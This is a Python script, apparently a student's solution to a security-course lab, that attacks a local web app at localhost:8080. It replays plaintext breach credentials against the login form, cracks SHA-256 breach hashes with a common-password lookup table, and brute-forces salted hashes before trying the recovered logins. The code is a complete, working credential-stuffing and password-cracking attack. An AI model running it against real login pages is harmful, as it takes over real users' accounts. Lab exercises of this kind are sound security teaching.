from csv import reader
import csv
from requests import post, codes
from app.util.hash import hash_sha256
from brute import load_common_passwords, brute_force_attack

LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
HASHED_BREACH_PATH = "app/scripts/breaches/hashed_breach.csv"
SALTED_BREACH_PATH = "app/scripts/breaches/salted_breach.csv"
COMMON_PASSWORDS_PATH = 'common_passwords.txt'

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def credential_stuffing_attack(creds):
    output =[]
    for username, password in creds:
        if attempt_login(username, password) == True:
            output.append((username, password))
    return output

def hash2pwd(creds, table):
    output = []
    for username, hashed in creds:
        if hashed in table:
            output.append((username, table[hashed]))
    return output



def main():
    # Task 1.2
    creds = load_breach(PLAINTEXT_BREACH_PATH)
    print("Task 1.2 Logins and Passwords")
    print(credential_stuffing_attack(creds))
    print("")

    # Task 1.3
    hashed_creds = load_breach(HASHED_BREACH_PATH)
    common_pwds = load_common_passwords()
    lookup_table = {}
    for pwd in common_pwds:
        hashed_pwd = hash_sha256(pwd[0])
        lookup_table[hashed_pwd] = pwd[0]

    unhashed_creds = hash2pwd(hashed_creds, lookup_table)
    print("Task 1.3 Logins and Passwords")
    print(credential_stuffing_attack(unhashed_creds))
    print("")

    # Task 1.5
    salted_creds = load_breach(SALTED_BREACH_PATH)
    unsalted_creds = []
    for username, hash, salt in salted_creds:
        pwd = brute_force_attack(hash, salt)
        unsalted_creds.append((username, pwd))
    
    print("Task 1.5 Logins and Passwords")
    print(credential_stuffing_attack(unsalted_creds))
    print("")


    


if __name__ == "__main__":
    main()
